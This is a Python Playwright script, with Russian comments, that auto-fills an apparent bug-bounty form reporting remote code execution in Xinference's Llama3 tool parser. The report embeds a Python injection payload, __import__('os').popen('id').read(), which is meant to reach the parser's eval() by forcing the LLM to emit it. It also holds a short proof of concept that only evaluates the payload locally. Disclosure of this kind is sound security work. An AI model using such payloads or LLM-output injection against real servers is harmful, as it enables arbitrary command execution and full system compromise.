import asyncio
from playwright.async_api import async_playwright

async def fill_form():
    async with async_playwright() as p:
        try:
            # Подключаемся к запущенному Chrome
            browser = await p.chromium.connect_over_cdp("http://localhost:9222")
            context = browser.contexts[0]
            page = context.pages[0]
            
            print(f"[*] Подключено к: {page.url}")

            # 1. Исправляем Repository (вводим org/repo)
            print("[*] Заполняю Repository...")
            repo_input = page.locator('input[placeholder*="Repository"], input[name="repository"], .mantine-Input-input').first
            await repo_input.click()
            await repo_input.fill("")
            await repo_input.type("xorbitsai/inference", delay=100)
            await page.keyboard.press("Enter")
            await asyncio.sleep(2)

            # 2. Title
            print("[*] Заполняю Title...")
            await page.locator('input[placeholder*="Title"]').fill("Remote Code Execution (RCE) via Unsafe eval() in Llama3 Tool Parser")

            # 3. Description (Markdown)
            print("[*] Заполняю Description...")
            description = """## Description
A critical vulnerability exists in the `llama3_tool_parser.py` component of Xinference. The parser uses the built-in Python `eval()` function to process output from the LLM when tool-calling is enabled.

The vulnerability is located in `xinference/model/llm/tool_parsers/llama3_tool_parser.py`:
```python
def extract_tool_calls(self, model_output: str):
    try:
        data = eval(model_output, {}, {})  # <--- VULNERABLE
```

## Steps to Reproduce
1. Deploy Llama3 model in Xinference.
2. Enable tool calling.
3. Force LLM to output: `{'name': 'x', 'parameters': __import__('os').popen('id').read()}`
4. Server executes code via eval()."""
            await page.locator('textarea[placeholder*="Description"]').fill(description)

            # 4. Impact
            print("[*] Заполняю Impact...")
            impact = "Successful exploitation allows an unauthenticated attacker to execute arbitrary system commands, leading to full server compromise."
            await page.locator('textarea[placeholder*="Impact"]').fill(impact)

            # 5. Permalink
            print("[*] Заполняю Permalink...")
            await page.locator('input[placeholder*="https://github.com/"]').fill("https://github.com/xorbitsai/inference/blob/main/xinference/model/llm/tool_parsers/llama3_tool_parser.py#L46")

            # 6. PoC
            print("[*] Заполняю Proof of Concept...")
            poc = "import requests\ntarget = 'http://localhost:9997'\npayload = \"{'name': 'x', 'parameters': __import__('os').popen('id').read()}\"\n# The server calls eval(payload, {}, {}) internally\nprint(eval(payload, {}, {}))"
            await page.locator('textarea[placeholder*="Proof of Concept"]').fill(poc)

            print("\n✅ ГОТОВО! Проверь браузер.")
            print("⚠️ Тебе осталось вручную выбрать:")
            print("1. Package Manager -> pypi")
            print("2. Vulnerability Type -> Code Injection")
            print("3. CVSS (8 кликов)")
            
        except Exception as e:
            print(f"❌ Ошибка: {e}")

asyncio.run(fill_form())
